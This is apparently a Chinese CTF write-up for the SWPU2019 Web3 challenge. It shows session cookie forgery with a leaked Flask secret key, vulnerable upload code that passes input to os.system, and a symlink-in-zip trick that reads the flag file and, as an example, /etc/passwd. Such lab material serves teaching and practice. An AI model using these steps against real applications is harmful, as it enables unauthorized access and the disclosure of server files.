# \[SWPU2019]Web3

## \[SWPU2019]Web3

## 考点

* Flask session伪造
* Linux命令
* `ln`命令新建"快捷方式"

## wp

标题flask-demo提示是个flask的框架

随便输入用户名和密码可以登录，然后回显用户名，这里可能有SSTI

![](<../../.gitbook/assets/image (8).png>)

点击upload提示`Permission denied!`，要进行flask session伪造，先试试SSTI，用户名输入`{{7*7}}`原样返回

![](<../../.gitbook/assets/image (7) (1).png>)

只能想其他办法获取`secret_key`，发现在404页面的返回头存在`Swpuctf_csrf_token`，为`U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==`

![](<../../.gitbook/assets/image (1) (1).png>)

解码后为`SECRET_KEY:keyqqqwwweee!@#$%^&*`，然后重新加密session，内容是`{'id': b'1', 'is_login': True, 'password': '111', 'username': 'admin'}`

```
flask-unsign --secret "keyqqqwwweee!@#$%^&*" --sign --cookie "{'id': b'1', 'is_login': True,
'password': '111', 'username': 'admin'}"
```

得到`eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTExIiwidXNlcm5hbWUiOiJhZG1pbiJ9.Ymz6jQ.Hk-k8PvafeNbp8uRfcuWnWVjJhA`

修改cookie可以访问`/upload`页面

在注释中找到代码

```python
@app.route('/upload',methods=['GET','POST'])
def upload():
    if session['id'] != b'1':
        return render_template_string(temp)
    if request.method=='POST':
        m = hashlib.md5()
        name = session['password']
        name = name+'qweqweqwe'
        name = name.encode(encoding='utf-8')
        m.update(name)
        md5_one= m.hexdigest()
        n = hashlib.md5()
        ip = request.remote_addr
        ip = ip.encode(encoding='utf-8')
        n.update(ip)
        md5_ip = n.hexdigest()
        f=request.files['file']
        basepath=os.path.dirname(os.path.realpath(__file__))
        path = basepath+'/upload/'+md5_ip+'/'+md5_one+'/'+session['username']+"/"
        path_base = basepath+'/upload/'+md5_ip+'/'
        filename = f.filename
        pathname = path+filename
        if "zip" != filename.split('.')[-1]:
            return 'zip only allowed'
        if not os.path.exists(path_base):
            try:
                os.makedirs(path_base)
            except Exception as e:
                return 'error'
        if not os.path.exists(path):
            try:
                os.makedirs(path)
            except Exception as e:
                return 'error'
        if not os.path.exists(pathname):
            try:
                f.save(pathname)
            except Exception as e:
                return 'error'
        try:
            cmd = "unzip -n -d "+path+" "+ pathname
            if cmd.find('|') != -1 or cmd.find(';') != -1:
				waf()
                return 'error'
            os.system(cmd)
        except Exception as e:
            return 'error'
        unzip_file = zipfile.ZipFile(pathname,'r')
        unzip_filename = unzip_file.namelist()[0]
        if session['is_login'] != True:
            return 'not login'
        try:
            if unzip_filename.find('/') != -1:
                shutil.rmtree(path_base)
                os.mkdir(path_base)
                return 'error'
            image = open(path+unzip_filename, "rb").read()
            resp = make_response(image)
            resp.headers['Content-Type'] = 'image/png'
            return resp
        except Exception as e:
            shutil.rmtree(path_base)
            os.mkdir(path_base)
            return 'error'
    return render_template('upload.html')


@app.route('/showflag')
def showflag():
    if True == False:
        image = open(os.path.join('./flag/flag.jpg'), "rb").read()
        resp = make_response(image)
        resp.headers['Content-Type'] = 'image/png'
        return resp
    else:
        return "can't give you"
```

session中的username为admin，password为111。

那这段代码就在说，先根据session中的username和password，以及IP地址生成上传目录，然后上传一个zip压缩包，对其进行解压，解压的文件名不能包含`/`，获得的第一个文件以图片形式展示。在`showflag()`中说明了flag的位置，但是不知道绝对路径。

如果使用`ln -s /proc/self/cwd/flag/flag.jpg test`新建一个指向`flag`的链接，再用`zip`压缩`test`文件，是不是就可以访问`flag`了，但是如果直接压缩不会保存连接符，要用`zip -y`参数

所以本题就是

1. `ln -s /proc/self/cwd/flag/flag.jpg test`
2. `zip -ry test.zip test`

再上传即可

![](<../../.gitbook/assets/image (6).png>)

## 小结

1. Linux下`/proc/self/cwd/`会指向进程的当前目录
2. `ln -s /etc/passwd test` 相当于新建一个链接到`/etc/passwd`的文件`test`，对`test`使用`cat`等命令会自动指向`/etc/passwd`
